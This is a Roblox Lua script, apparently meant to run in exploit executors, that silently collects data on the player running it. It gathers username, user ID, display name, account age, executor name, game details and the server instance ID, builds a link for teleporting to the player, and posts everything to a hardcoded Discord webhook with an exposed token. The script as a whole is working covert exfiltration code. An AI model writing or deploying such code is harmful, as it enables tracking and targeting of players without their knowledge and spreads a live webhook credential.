if _G.Honey_Valley then return end
_G.Honey_Valley = true

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1341321907437436999/LAc4oaP77sn7Py_zSbIV8SRKiEZaHgGIthCD0RmEjjEpR8XmYMwtFA-ZnTfxq0DfiDwQ"

local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
if not http_request then return end

local player = Players.LocalPlayer
local userId = player.UserId
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"

local function getThumbnail(userId)
    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=75x75&format=Png"
    local response = http_request({ Url = url, Method = "GET", Headers = { ["Content-Type"] = "application/json" } })
    local data = HttpService:JSONDecode(response.Body)
    return data.data and data.data[1] and data.data[1].imageUrl or ""
end

local function formatFields()
    return "**Game Name :**       `" .. gameInfo.Name .. "`  |  **Game Link :** [Click here](https://www.roblox.com/games/" .. game.PlaceId .. ")\n" ..
           "**Place ID :**       `" .. game.PlaceId .. "`\n" ..
           "**Username :**       [" .. player.Name .. "](https://www.roblox.com/users/" .. userId .. "/profile)  |  **Display Name :** `" .. player.DisplayName .. "`\n" ..
           "**User ID :**       `" .. userId .. "`\n" ..
           "**Account Age :**       `" .. player.AccountAge .. " days`\n" ..
           "**Executor :**       `" .. executorName .. "`\n" ..
           "**[Teleport to Player](https://thehunt.click/?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")**"
end

local payload = {
    embeds = {
        {
            color = 14177041,
            title = "@everyone :) Player Information",
            description = formatFields(),
            thumbnail = { url = getThumbnail(userId) },
            footer = { text = "Information sent via script" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}

local success, err = pcall(function()
    http_request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload)
    })
end)

if not success then
    warn("Failed to send webhook: " .. tostring(err))
else
    print("Webhook sent successfully!")
end
